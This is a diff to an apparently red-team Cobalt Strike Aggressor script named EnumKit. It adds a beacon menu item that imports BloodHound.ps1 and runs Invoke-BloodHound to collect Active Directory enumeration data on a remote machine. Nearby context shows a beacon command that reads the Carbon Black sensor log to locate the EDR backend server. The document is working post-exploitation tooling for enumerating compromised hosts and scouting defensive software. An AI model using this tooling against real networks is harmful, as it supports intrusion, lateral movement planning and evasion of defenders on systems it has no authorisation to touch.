@@ -1,6 +1,16 @@
 # Actions in this kit center around host and network enumeration. Credential enumeration actions should go in CredKit instead.
 # @Und3rf10w
 
+sub run_bloodhound {
+	$bid = $1;
+	binput($bid, "powershell-import " . script_resource("EnumKit/scripts/BloodHound.ps1"));
+	bpowershell_import($bid, script_resource("EnumKit/scripts/BloodHound.ps1"));
+	prompt_text("CSV output folder (on remote machine)", "C:\\Temp", {
+		binput($bid, "powershell Invoke-BloodHound -CSVFolder $1");
+		bpowershell($bid, "Invoke-BloodHound -CSVFolder $1");
+	});
+}
+
 popup beacon_bottom {
 	menu "EnumKit" {
 		menu "PowerView"{
@@ -70,6 +80,14 @@ popup beacon_bottom {
 				foreach $bid ($1){
 					binput($1, "shell type C:\\Windows\\CarbonBlack\\Sensor.LOG | findstr SensorBackendServer");
 					bshell($1, "type C:\\Windows\\CarbonBlack\\Sensor.LOG | findstr SensorBackendServer");
+				}
+			}
+		}
+		menu "Bloodhound"{
+			item "Run Bloodhound"{
+				local('$bid');
+				foreach $bid ($1){
+					run_bloodhound($bid);
 				}
 			}
 		}
